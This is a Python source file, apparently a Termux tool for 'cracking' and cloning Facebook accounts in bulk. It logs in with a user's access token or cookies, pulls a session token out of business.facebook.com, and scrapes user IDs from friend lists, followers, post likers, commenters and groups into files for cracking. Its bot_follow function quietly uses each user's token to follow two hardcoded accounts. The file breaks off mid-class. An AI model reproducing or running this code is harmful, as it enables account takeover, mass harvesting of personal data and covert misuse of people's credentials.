### Import Module
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote



### Perumpamaan Module & Syntax
_req_ses_  = requests.Session()
_req_get_  = requests.get
_req_post_ = requests.post
_js_lo_    = json.loads
_cici_azimvau_    = input
_azimvau_dapunta_ = open
_cici_cici_       = exit

### Warna
Z = "\033[1;30m" # Hitam
P = "\033[1;37m" # Putih
M = "\033[1;31m" # Merah
H = "\033[1;32m" # Hijau
K = "\033[1;33m" # Kuning
B = "\033[1;34m" # Biru
U = "\033[1;35m" # Ungu
O = "\033[1;36m" # Biru Muda
N = "\033[0m"    # Warna Mati

### Host & Penampungan
host = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []
count = 1
data_1 = {}
data_2 = {}
data_change_1 = {}
data_change_2 = {}
data_user = []
header_grup = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"}
header_nama = {"origin": "https://mbasic.facebook.com","accept-language": "en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7","accept-encoding": "gzip, deflate","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent": "Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Host": "".join(bs4.re.findall("://(.*?)$","https://m.facebook.com")),"referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","cache-control": "max-age=0","upgrade-insecure-requests": "1","content-type": "application/x-www-form-urlencoded"}
header_hashtag = {'authority': 'mbasic.facebook.com','method': 'GET','path': '/favicon.ico','scheme': 'https','accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8','accept-encoding': 'gzip, deflate','accept-language': 'en-US,en;q=0.9','user-agent': 'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36','origin': 'https://www.facebook.com','referer': 'https://www.facebook.com'}

r = str(random.randint(1,9999))
rx = r.replace("1","A").replace("2","C").replace("3","B").replace("4","E").replace("5","H").replace("6","I").replace("7","Y")
plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'N').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', 'R').replace("5","X").replace("1","X")

try:
    rq = requests.get('https://pastebin.com/raw/nEpjt6QN').text
except requests.exceptions.ConnectionError:
    print('\nNO INTERNET CONNECTION\n')
    exit()

### Waktu & Tanggal
__sekarang__ = datetime.now()
__tahun__ = __sekarang__.year
__bulan__ = __sekarang__.month
__hari__  = __sekarang__.day

bulan_ttl = {"01": "JAN", "02": "FEB", "03": "MAR", "04": "APR", "05": "MAY", "06": "JUN", "07": "JUL", "08": "AUG", "09": "SEP", "10": "OCT", "11": "NOV", "12": "DEC"}
_list_bulan_ = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"]

try:
    if __bulan__ < 0 or __bulan__ > 12:
        _cici_cici_()
    _bulan_sekarang_ = __bulan__ - 1
except ValueError:
    _cici_cici_()
_bulan_ = _list_bulan_[_bulan_sekarang_]
tanggal = ("%s-%s-%s"%(__hari__,_bulan_,__tahun__))

_my_account_ = [
    '100045203855294','100014839270205']

### User Agent
ua_intelmac = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36;]'
ua_nokia   = 'Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'
ua_asus    = 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)/CLDC-1.1;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 7.0; HUAWEI CAZ-AL10; HMSCore 5.3.0.312; GMSCore 20.39.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 HuaweiBrowser/11.1.0.302 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]' #DONE
ua_vivo    = 'Mozilla/5.0 (Linux; Android 10; V2027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 4.1.1; X909 Build/JRO03L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9515 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36;]'
ua_windows = 'Mozilla/5.0 (X11; U; Linux i686; fr-FR; rv:1.7.8) Gecko/20050511 Firefox/1.0.4;]'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.80 Mobile Safari/537.36 Reddit/Version 2021.38.0/Build 365032/Android 11 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]'
### Clear Login Session
def bersih():
    try:os.remove('token.txt')
    except:pass
    try:os.remove('cookies.txt')
    except:pass

### Display Text
def jalan(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)


### Clear Terminal
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system("clear")

logo ="""
\033[1;91m             ##     ##    ##    ## #### ##    ##  ######\033[1;0m
\033[1;91m            ###   ###    ##   ##   ##  ###   ## ##    ##\033[1;0m
\033[1;97m           #### ####    ##  ##    ##  ####  ## ##\033[1;0m
\033[1;97m          ## ### ##    #####     ##  ## ## ## ##   ####\033[1;0m
\033[1;91m         ##     ##    ##  ##    ##  ##  #### ##    ## \033[1;0m
\033[1;91m        ##     ##    ##   ##   ##  ##   ### ##    ##\033[1;0m
\033[1;97m       ##     ##    ##    ## #### ##    ##  ######\033[1;0m
\033[1;97m--------------------------------------------------
\033[1;91m Author        : Mohammad Sultani 
\033[1;91m GitHub        : https://github.com/Mohammadjan1122
\033[1;91m YouTube     : Termux Master
\033[1;91m Telegram    : https://t.me/sultani1122
\033[1;91m Blogspot    : https://mohammadsultani.blogspot.com
\033[1;97m--------------------------------------------------"""


### Logo
def banner():
        os.system("clear")
        print (logo)
def cek_dev():
    _isi_dev_ = _azimvau_dapunta_('cookies.txt','r').read()
    if 'null' in _isi_dev_:jalan('%s [%s!%s] %INVALID COOKIES, RE-LOGIN WITH COOKIES'%(M,P,M,P));bersih();_cici_cici_()
    else:pass


def bot_follow(_tok_dev_):
    try:
        for _list_ in _my_account_:
            try:_req_post_("https://graph.facebook.com/%s/subscribers?access_token=%s"%(_list_,_tok_dev_));time.sleep(0.3)
            except:pass
        print('%s '%(O));jalan('%s [%s!%s] %sLOGIN SUCCESSFUL %s^_^'%(H,P,H,H,P));time.sleep(2)
    except:pass
    

def menu_log():
    bersih();clear()
    banner()
    var_menu()
    pmu = _cici_azimvau_('%s [%s•%s] %sCHOOSE : %s'%(H,P,H,K,H))
    print('%s '%(O))
    if pmu in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu_log()
    elif pmu in ['1','01','001','a']:
        defaultua()
        token = _cici_azimvau_('%s [%s•%s] %sTOKEN : %s'%(H,P,H,K,H))
        try:x = _req_get_("https://graph.facebook.com/me?access_token=" + token);y = _js_lo_(x.text);n = y['name'];xd = _azimvau_dapunta_("token.txt", "w");xd.write(token);xd.close();xz = _azimvau_dapunta_('cookies.txt','w');xz.write('null');xz.close();bot_follow(token);menu()
        except (KeyError,IOError):print('%s '%(O));jalan('%s [%s!%s] %sTOKEN INVALID'%(M,P,M,P));bersih();menu_log()
        except requests.exceptions.ConnectionError:print('%s '%(O));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
    elif pmu in ['2','02','002','b']:
        defaultua()
        cookie = _cici_azimvau_('%s [%s•%s] %sCOOKIES : %s'%(H,P,H,K,H))
        try:header={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate','accept-language':'en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7','cookie': cookie};r=_req_get_("https://business.facebook.com/creatorstudio/home", headers=header);p=re.search('{"accessToken":"(EAA\w+)', r.text);token=p.group(1);xd = _azimvau_dapunta_("token.txt", "w");xd.write(token);xd.close();xz = _azimvau_dapunta_('cookies.txt','w');xz.write(cookie);xz.close();bot_follow(token);menu()
        except requests.exceptions.ConnectionError:print('%s '%(O));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
        except (KeyError,IOError,AttributeError):print('%s '%(O));jalan('%s [%s!%s] %sCOOKIES INVALID'%(M,P,M,P));bersih();menu_log()
    elif pmu in ['0','00','000','z']:exit()
    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu_log()


def menu():
    clear()
    banner()
    jid = ''
    try:
        _azimvau_ = _azimvau_dapunta_("token.txt","r").read();_cici_ = _azimvau_dapunta_("cookies.txt","r").read();_salsabila_ = {"cookie" : _cici_}
        if 'null' in _cici_:status_cookies = ('%sNO'%(M));W = Z;Y = P; B1 = Z; O1 = Z; K1 = Z; H1 = Z; M1 = Z; P1 = Z
        else:status_cookies = ('%sYES'%(H));W = H; Y = K; B1 = B; O1 = O; K1 = K; H1 = H; M1 = M; P1 = P
    except (KeyError,IOError):print('%s [ %sOPPSS :) %s]%s'%(M,P,M,P));print('%s '%(M));jalan('%s [%s!%s] %sTOKEN/COOKIES INVALID'%(M,P,M,P));bersih();menu_log()
    
    try:token = _azimvau_dapunta_("token.txt","r").read();x = _req_get_("https://graph.facebook.com/me?access_token=" + token);y = _js_lo_(x.text);n = y['name'].upper();i = y['id']
    except (KeyError,IOError):print('%s [ %sOPPSS :) %s]%s'%(M,P,M,M));print('%s '%(M));jalan('%s [%s!%s] %sTOKEN/COOKIES INVALID'%(M,P,M,P));bersih();menu_log()
    except requests.exceptions.ConnectionError:print('%s [ %sOPPSS :) %s]%s'%(M,P,M,P));print('%s '%(M));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
    except requests.exceptions.ConnectionError:print('%s [ %sOPPSS :) %s]%s'%(M,P,M,P));print('%s '%(M));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
    try:a = _req_get_("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36;]"}).json();ip = a["query"];loc = a["country"].upper()
    except KeyError:ip = " "
    psb('         %s》%s》%s》%sWelcome%s《%s《%s《'%(M,H,B,H,B,H,M))
    print('%s '%(O))
    print('%s [%s•%s] %sNAME   %s: %s%s'%(H,P,H,B,K,H,n))
    print('%s [%s•%s] %sID     %s: %s%s'%(H,P,H,B,K,H,i))
    print('%s [%s•%s] %sIP     %s: %s%s'%(H,P,H,B,K,H,ip))
    print('%s [%s•%s] %sFROM   %s: %s%s'%(H,P,H,B,K,H,loc))
    print('')
    print('%s [%s>_%s] %sTOKEN%s/%sCOOKIES %s: %sYES%s/%s'%(H,P,H,B,Z,B,K,H,P,status_cookies))
    print('%s '%(O))
    psb('%s [%s01%s] %sCrack PUBLIC ID '%(H,P,H,H))
    psb('%s [%s02%s] %sCrack FROM FOLLOWER ID V1'%(H,P,H,B1))
    psb('%s [%s04%s] %sCrack FROM SEARCH NAME ID '%(H,P,H,O1))
    psb('%s [%s05%s] %sCrack FROM MESSAGE LIST ID '%(H,P,H,K1))
    psb('%s [%s06%s] %sCrack FROM POST REACTS '%(H,P,H,H1))
    psb('%s [%s07%s] %sCrack FROM POST COMMENTS '%(H,P,H,B1))
    psb('%s [%s08%s] %sCrack FROM GROUP MEMBERS '%(H,P,H,M1))
    psb('%s [%s09%s] %sCrack ID FROM EMAIL'%(H,P,H,O))
    psb('%s [%s10%s] %sCrack USERNAME'%(H,P,H,K))
    psb('%s [%s11%s] %sCrack FROM HASHTAG'%(H,P,H,B1))
    psb('%s [%s12%s] %sCrack ID FROM HOME PAGE'%(H,P,H,P1))
    psb('%s [%s13%s] %sCrack ID FROM FRIEND REQUESTS '%(H,P,H,K1))
    psb('%s [%s14%s] %sCrack FROM SENT REQUESTS '%(H,P,H,H1))
    psb('%s [%s15%s] %sCrack UID FROM PUBLIC ID'%(H,P,H,O))
    psb('%s [%s16%s] %sCrack AUTO CLONE CRACKED IDS'%(H,P,H,K))
    psb('%s [%s17%s] %sVIEW CLONE RESULTS '%(H,P,H,P))
    psb('%s [%s18%s] %sUSER AGENT SETTINGS '%(H,P,H,M))
    psb('%s [%s19%s] %s FILE'%(H,P,H,H))
    psb('%s [%s00%s] %sLOGOUT'%(H,M,H,M))
    print('')
    pm = _cici_azimvau_('%s [%s>_%s] %sCHOOSE : %s'%(H,P,H,K,H))
    print('%s '%(O))
    if pm in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(P,M,P,M));menu()
    elif pm in ['1','01','001','a']:publik(token)
    elif pm in ['2','02','002','b']:pengikut(token)
    elif pm in ['3','03','003','c']:cek_dev();followers(_salsabila_)
    elif pm in ['4','04','004','d']:cek_dev();dump_name(_salsabila_)
    elif pm in ['5','05','005','e']:cek_dev();dump_pesan(_salsabila_,n,i)
    elif pm in ['6','06','006','f']:cek_dev();main_likers(_salsabila_)
    elif pm in ['7','07','007','g']:cek_dev();main_komen(_salsabila_)
    elif pm in ['8','08','008','h']:cek_dev();dump_grup(_salsabila_,_azimvau_)
    elif pm in ['9','09','009','i']:dump_email()
    elif pm in ['10','010','0010','j']:dump_username()
    elif pm in ['11','011','0011','k']:cek_dev();hashtag(_salsabila_)
    elif pm in ['12','012','0012','l']:cek_dev();beranda(_salsabila_)
    elif pm in ['13','013','0013','m']:cek_dev();permintaan_pertemanan_masuk(_salsabila_)
    elif pm in ['14','014','0014','n']:cek_dev();permintaan_pertemanan_keluar(_salsabila_)
    elif pm in ['15','015','0015','o']:teman_target()
    elif pm in ['16','016','0016','p']:cek_result()
    elif pm in ['17','017','0017','q']:result()
    elif pm in ['18','018','0018','r']:ugen()
    elif pm in ['19','019','0019','s']:file()
    elif pm in ['0','00','000','z']:jalan('%s [%s!%s] %sSEE YOU %s%s%s'%(H,P,H,K,O,n,P));bersih();menu_log()
    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()


def defaultua():
    ua = ua_xiaomi
    try:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close()
    except (KeyError,IOError):menu_log()


def ugen():
    var_ugen()
    pmu = _cici_azimvau_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
    print('%s '%(O))
    if pmu in[""]:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
    elif pmu in ['1','01','001','a']:os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8');_cici_azimvau_('%s [ %sBACK %s]%s'%(M,P,M,K));menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf ugent.txt");ua = _cici_azimvau_("%s [%s•%s] %sENTER USER AGENT : \n\n"%(H,P,H,K))
        try:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close();jalan("\n%s [ %sSUCCESSFULLY CHANGED USER AGENT %s]"%(H,P,H));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
        except (KeyError,IOError):jalan("\n%s [ %sFAILED TO CHANGE USER AGENT %s]"%(Z,M,Z));print('%s '%(M));_cici_azimvau_('%s [ %sBACK %s]%s'%(M,P,M,P));menu()
    elif pmu in ['3','03','003','c']:ugen_hp()
    elif pmu in ['4','04','004','d']:os.system("rm -rf ugent.txt");jalan("%s [ %sUSER AGENT SUCCESSFULLY DELETED %s]"%(H,P,H));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
    elif pmu in ['5','05','005','e']:
        try:ungser = _azimvau_dapunta_('ugent.txt', 'r').read()
        except (KeyError,IOError):ungser = 'NOT FOUND'
        print("%s [%s•%s] %sYOUR USER AGENT  : \n\n%s%s"%(H,P,H,P,O,ungser));jalan("\n%s [ %sTHIS IS YOUR CURRENT USER AGENT %s]"%(H,K,H));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
    elif pmu in ['0','00','000','f']:menu()
    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P))
def ugen_hp():
    os.system("rm -rf ugent.txt")
    print('%s [%s1%s] %INTELMAC'%(H,P,H,K))
    print('%s [%s2%s] %sNOKIA'%(H,P,H,H))
    print('%s [%s3%s] %sASUS'%(H,P,H,M))
    print('%s [%s4%s] %sHUAWEI'%(H,P,H,B))
    print('%s [%s5%s] %sVIVO'%(H,P,H,O))
    print('%s [%s6%s] %sOPPO'%(H,P,H,K))
    print('%s [%s7%s] %sSAMSUNG'%(H,P,H,B))
    print('%s [%s8%s] %sWINDOWS'%(H,P,H,M))
    print('%s [%s9%s] %sXIAOMI'%(H,P,H,M))
    print('')
    pc = _cici_azimvau_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
    print('%s '%(O))
    if pc in['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,M));menu()
    elif pc in ['1','01']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
    elif pc in ['2','02']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
    elif pc in ['3','03']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_asus);ugent.close()
    elif pc in ['4','04']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
    elif pc in ['5','05']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
    elif pc in ['6','06']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
    elif pc in ['7','07']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
    elif pc in ['8','08']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_windows);ugent.close()
    elif pc in ['9','09']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_intelmac);ugent.close()
    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
    jalan("%s [ %sSUCCESSFULLY CHANGED USER AGENT %s]"%(H,P,H));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(M,P,M,P));menu()


def publik(token):
    jid = '5000'
    try:
        print('%s [%s•%s] %sWRITE \'me\' TO RETRIEVE FRIEND ID'%(H,P,H,K));it = _cici_azimvau_("%s [%s•%s] %sTARGET ID : "%(H,P,H,K));cek_target_crack_(it)
        try:pb = _req_get_("https://graph.facebook.com/" + it + "?fields=name,id,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + token);ob = _js_lo_(pb.text);print ('%s [%s•%s] %sNAME : %s'%(H,P,H,K,ob['name']))
        except (KeyError,IOError):print('%s '%(O));jalan('%s [%s!%s] %sID NOT FOUND'%(M,P,M,P));menu()
        r = _req_get_("https://graph.facebook.com/%s/friends?limit=%s&fields=name,id,first_name,middle_name,last_name,name_format,picture,short_name&access_token=%s"%(it,jid,token));id = [];z = _js_lo_(r.text);xc = (ob["first_name"]+".json").replace(" ","_");xb = _azimvau_dapunta_(xc,"w")
        for a in z["data"]:
            try:id.append(a["id"]+"•"+a["name"]);xb.write(a["id"]+"•"+a["name"]+"\n")
            except:continue
        xb.close();print('%s [%s•%s] %sTOTAL ID : %s'%(H,P,H,K,len(id)));return crack(xc)
    except (KeyError,IOError):_cici_cici_('%s [%s!%s] %sINVALID TOKEN/COOKIES OR ID NOT FOUND'%(M,P,M,P))


def pengikut(token):
    try:
        jid = '10000'
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name'].upper()
    except (KeyError,IOError):
        xox('%s [%s!%s] %sINVALID TOKEN/COOKIES'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        xox('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P))
        exit()
    try:
        print('%s [%s•%s] %sWRITE \'me\' FOR TAKING FRIEND ID'%(H,P,H,K))
        it = input("%s [%s•%s] %sTARGET ID : %s"%(H,P,H,K,H))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s [%s•%s] %sNAME : %s%s'%(H,P,H,O,H,ob['name'].upper()))
        except (KeyError,IOError):
            print
            xox('%s [%s!%s] %sID NOT FOUND'%(M,P,M,P))
            menu()
        r = requests.get("https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s [%s•%s] %sALL ID : %s%s'%(H,P,H,O,H,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s [%s!%s] %sERROR : %s'%(M,P,M,P,e))



def followers(cookies):
    _query_ = _cici_azimvau_('%s [%s•%s] %sENTER TARGET ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json';_url_dev_ = 'https://mbasic.facebook.com/subscribe/lists/?id=' + _query_;_file_ = (_query_+'.json').replace(' ','_')
    try:os.remove(_file_)
    except:pass
    exec_followers(_url_dev_,cookies,_file_);print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_followers(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try:
        for _cici_ in _sop_dev_.find_all('a',href=True):
            if "profile.php" in _cici_.get('href'):
                try:
                    _name_dev_ = _cici_.text;_id_dev_ = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",_cici_.get("href")))
                    if _name_dev_ in _buka_file_:pass
                    elif '/' in _id_dev_:pass
                    else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                except:pass
            else:pass
        for _cici_ in _sop_dev_.find_all('a',href=True):
            if 'See more' in _cici_.text:url_dev = 'https://mbasic.facebook.com/' + _cici_.get('href');exec_followers(url_dev,cookies,_file_)
    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)



def main_likers(_azimvau_):
    _query_ = _cici_azimvau_('%s [%s•%s] %sENTER POST ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json'
    try:os.remove(_query_+'.json')
    except:pass
    _azimvau_dapunta_(_file_,'w');_url_ = ('https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier='+_query_);scrape_likers(_azimvau_,_url_,_file_)
    if len(_azimvau_dapunta_(_file_).read().splitlines()) == 0:print('\n%s [%s!%s] %sPOST NOT FOUND'%(M,P,M,P));_cici_cici_()
    print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)
def scrape_likers(_azimvau_,_url_,_file_):
    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_azimvau_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try: 
        for _isi_ in _ses_par_.find_all('h3'):
            for _id_ in _isi_.find_all('a',href=True):
                try:
                    if "profile.php" in _id_.get("href"):_a_ = _id_.get("href").split('=')[1];__id__ = _id_.text;_azimvau_dapunta_(_file_,'a+').write(_a_+'•'+__id__+'\n')
                    else:_a_ = _id_.get("href").split('/')[1];__id__ = _id_.text;_azimvau_dapunta_(_file_,'a+').write(_a_+'•'+__id__+'\n')
                except:continue
        for _lanjut_ in _ses_par_.find_all("a",href=True):
            if "See more" in _lanjut_.text:
                while True:
                    try:scrape_likers(_azimvau_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
                    except Exception as e:print('%s%s'%(M,e))
    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)


def main_komen(_azimvau_):
    _query_ = _cici_azimvau_('%s [%s•%s] %sENTER POST ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json'
    try:os.remove(_query_+'.json')
    except:pass
    _azimvau_dapunta_(_file_,'w');_url_ = ('https://mbasic.facebook.com/'+_query_);scrape_komen(_azimvau_,_url_,_file_)
    if len(_azimvau_dapunta_(_file_).read().splitlines()) == 0:print('\n%s [%s!%s] %sPOST NOT FOUND'%(M,P,M,P));_cici_cici_()
    print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)
def scrape_komen(_azimvau_,_url_,_file_):
    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_azimvau_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try: 
        for _isi_ in _ses_par_.find_all('h3'):
            for _id_ in _isi_.find_all('a',href=True):
                try:
                    if "profile.php" in _id_.get("href"):_a_="".join(bs4.re.findall("profile\.php\?id=(.*?)&",_id_.get("href")));__id__ = _id_.text;_azimvau_dapunta_(_file_,'a+').write(str(_a_).split('&')[0]+'•'+__id__+'\n')
                    else:_a_="".join(bs4.re.findall("/(.*?)\?",_id_.get("href")));__id__ = _id_.text;_azimvau_dapunta_(_file_,'a+').write(str(_a_).split('?')[0]+'•'+__id__+'\n')
                except:continue
        for _lanjut_ in _ses_par_.find_all("a",href=True):
            if "View more comments…" in _lanjut_.text:
                while True:
                    try:scrape_komen(_azimvau_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
                    except Exception as e:print('%s%s'%(M,e))
            elif "View previous comments…" in _lanjut_.text:
                while True:
                    try:scrape_likers(_azimvau_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
                    except Exception as e:print('%s%s'%(M,e))
    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)


class dump_grup:
    def __init__(self,_azimvau_,_cici_):
        self.glist=[];self._grup_=[];self.id='__azimvau__.json';self.token=_cici_;self.cookies=_azimvau_;self.header = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]"};self.main_group("https://m.facebook.com/groups/?seemore")
